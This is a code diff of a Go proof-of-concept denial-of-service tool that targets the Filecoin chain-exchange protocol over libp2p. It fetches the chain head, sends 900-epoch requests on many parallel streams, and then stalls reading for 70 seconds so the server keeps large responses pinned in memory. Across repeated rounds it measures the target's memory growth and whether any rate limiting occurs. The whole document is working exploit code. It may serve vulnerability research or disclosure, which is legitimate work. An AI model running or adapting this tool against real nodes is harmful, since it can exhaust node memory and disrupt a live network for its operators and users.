@@ -74,11 +74,11 @@ func writeUint(w *bytes.Buffer, v uint64) {
 
 /// getHead fetches chain head via JSON-RPC
 /// parses CIDs from DAG-JSON format: {"/": "bafy..."}
-func getHead(api string) ([]cid.Cid, error) {
+func getHead(api string) ([]cid.Cid, uint64, error) {
 	resp, err := http.Post(api, "application/json",
 		strings.NewReader(`{"jsonrpc":"2.0","method":"Filecoin.ChainHead","params":[],"id":1}`))
 	if err != nil {
-		return nil, err
+		return nil, 0, err
 	}
 	defer resp.Body.Close()
 
@@ -90,21 +90,22 @@ func getHead(api string) ([]cid.Cid, error) {
 			Cids []struct {
 				Root string `json:"/"`
 			} `json:"Cids"`
+			Height uint64 `json:"Height"`
 		} `json:"result"`
 	}
 	if err := json.Unmarshal(data, &r); err != nil {
-		return nil, err
+		return nil, 0, err
 	}
 
 	var cids []cid.Cid
 	for _, c := range r.Result.Cids {
 		parsed, err := cid.Decode(c.Root)
 		if err != nil {
-			return nil, err
+			return nil, 0, err
 		}
 		cids = append(cids, parsed)
 	}
-	return cids, nil
+	return cids, r.Result.Height, nil
 }
 
 /// getRSS reads VmRSS from /proc/pid/status (linux only)
@@ -122,51 +123,41 @@ func getRSS(pid int) int64 {
 	return 0
 }
 
-type result struct {
-	ok       bool
-	bytesIn  int
-	duration time.Duration
-}
-
-/// attack opens stream, sends max-length request, stalls read to pin server memory
-/// server builds full response then blocks on write for up to 60s (WriteResDeadline)
-func attack(ctx context.Context, h host.Host, t peer.ID, req []byte, stallSec int, out chan<- result) {
-	r := result{}
-	start := time.Now()
-
+/// attack opens stream, sends max-length request, then stalls read
+///
+/// the server builds full []*BSTipSet response in heap via collectChainSegment,
+/// then calls WriteCborRPC(buffered, resp) with 60s WriteResDeadline.
+/// if response > TCP send buffer (~128-256KB) and we don't read,
+/// the server goroutine blocks on write with the full response pinned in memory.
+///
+/// on short chains (devnet) the response is small enough to fit in TCP buffer
+/// so the server won't actually block. need chain depth >= 900 epochs for full effect.
+func attack(ctx context.Context, h host.Host, t peer.ID, req []byte, out chan<- bool) {
 	s, err := h.NewStream(ctx, t, proto)
 	if err != nil {
-		out <- r
+		out <- false
 		return
 	}
 	defer s.Close()
 
-	/// send request
+	/// send request & signal done writing
 	s.Write(req)
 	s.CloseWrite()
 
-	/// stall read: 1 byte per interval creates TCP backpressure
-	/// server goroutine blocks on WriteCborRPC with full response in heap
-	buf := make([]byte, 1)
-	for {
-		s.SetReadDeadline(time.Now().Add(time.Duration(stallSec) * time.Second))
-		n, err := s.Read(buf)
-		r.bytesIn += n
-		if err != nil {
-			break
-		}
-		/// slow drain keeps server blocked
-		time.Sleep(time.Duration(stallSec) * time.Second)
-	}
+	/// don't read. let TCP backpressure build.
+	/// server goroutine pins response in heap until WriteResDeadline (60s) fires.
+	/// we wait 70s to outlast the server's deadline.
+	time.Sleep(70 * time.Second)
 
-	r.ok = true
-	r.duration = time.Since(start)
-	out <- r
+	/// drain whatever's left so stream closes clean
+	io.Copy(io.Discard, s)
+
+	out <- true
 }
 
 func main() {
 	if len(os.Args) < 5 {
-		fmt.Fprintf(os.Stderr, "usage: %s <api> <multiaddr> <peerid> <streams> [pid] [stall_sec]\n", os.Args[0])
+		fmt.Fprintf(os.Stderr, "usage: %s <api> <multiaddr> <peerid> <streams> [pid] [rounds]\n", os.Args[0])
 		os.Exit(1)
 	}
 
@@ -176,21 +167,25 @@ func main() {
 	if len(os.Args) > 5 {
 		pid, _ = strconv.Atoi(os.Args[5])
 	}
-	/// stall interval: seconds between each 1-byte read
-	stallSec := 5
+	rounds := 1
 	if len(os.Args) > 6 {
-		stallSec, _ = strconv.Atoi(os.Args[6])
+		rounds, _ = strconv.Atoi(os.Args[6])
 	}
 
-	heads, err := getHead(api)
+	heads, height, err := getHead(api)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "getHead: %v\n", err)
 		os.Exit(1)
+	}
+	fmt.Printf("chain height: %d\n", height)
+	if height < 900 {
+		fmt.Fprintf(os.Stderr, "warn: chain height < 900, responses will be small (need calibnet or long devnet)\n")
 	}
 
 	/// Length=900 (MaxRequestLength = policy.ChainFinality)
 	/// Options=3 (Headers|Messages)
 	req := encodeReq(heads, 900, 3)
+	fmt.Printf("request size: %d bytes\n", len(req))
 
 	priv, _, _ := crypto.GenerateKeyPair(crypto.Ed25519, -1)
 	h, _ := libp2p.New(libp2p.Identity(priv))
@@ -207,11 +202,9 @@ func main() {
 	}
 
 	baseRSS := getRSS(pid)
-	results := make(chan result, n)
-	var wg sync.WaitGroup
 	var peakRSS int64
 
-	/// monitor RSS during attack
+	/// monitor RSS in background
 	done := make(chan struct{})
 	go func() {
 		tick := time.NewTicker(500 * time.Millisecond)
@@ -229,33 +222,53 @@ func main() {
 	}()
 
 	t0 := time.Now()
-	for i := 0; i < n; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			attack(ctx, h, target, req, stallSec, results)
-		}()
-	}
-	go func() { wg.Wait(); close(results) }()
+	totalOK := 0
 
-	var ok, totalBytes int
-	var totalDur time.Duration
-	for r := range results {
-		if r.ok {
-			ok++
-			totalBytes += r.bytesIn
-			totalDur += r.duration
+	for round := 0; round < rounds; round++ {
+		if rounds > 1 {
+			fmt.Printf("\n--- round %d/%d ---\n", round+1, rounds)
+		}
+
+		results := make(chan bool, n)
+		var wg sync.WaitGroup
+
+		roundStart := time.Now()
+		for i := 0; i < n; i++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				attack(ctx, h, target, req, results)
+			}()
+		}
+		go func() { wg.Wait(); close(results) }()
+
+		ok := 0
+		for r := range results {
+			if r {
+				ok++
+			}
+		}
+		totalOK += ok
+
+		rssNow := getRSS(pid)
+		peak := atomic.LoadInt64(&peakRSS)
+		fmt.Printf("streams: %d/%d\n", ok, n)
+		fmt.Printf("time: %.1fs\n", time.Since(roundStart).Seconds())
+		if pid > 0 {
+			fmt.Printf("rss now: %dM (peak %dM)\n", rssNow/1024, peak/1024)
+		}
+		if ok == n {
+			fmt.Printf("result: all streams accepted, no rate limiting, no GoAway\n")
 		}
 	}
-	close(done)
 
+	close(done)
 	finalRSS := getRSS(pid)
 	peak := atomic.LoadInt64(&peakRSS)
 
-	/// output
-	fmt.Printf("streams: %d/%d\n", ok, n)
-	fmt.Printf("bytes recv: %d total\n", totalBytes)
-	fmt.Printf("time: %.1fs\n", time.Since(t0).Seconds())
+	fmt.Printf("\n--- summary ---\n")
+	fmt.Printf("total streams: %d/%d across %d round(s)\n", totalOK, n*rounds, rounds)
+	fmt.Printf("total time: %.1fs\n", time.Since(t0).Seconds())
 	if pid > 0 && baseRSS > 0 {
 		fmt.Printf("rss: %dM -> %dM (peak %dM, growth %dM)\n",
 			baseRSS/1024, finalRSS/1024, peak/1024, (peak-baseRSS)/1024)
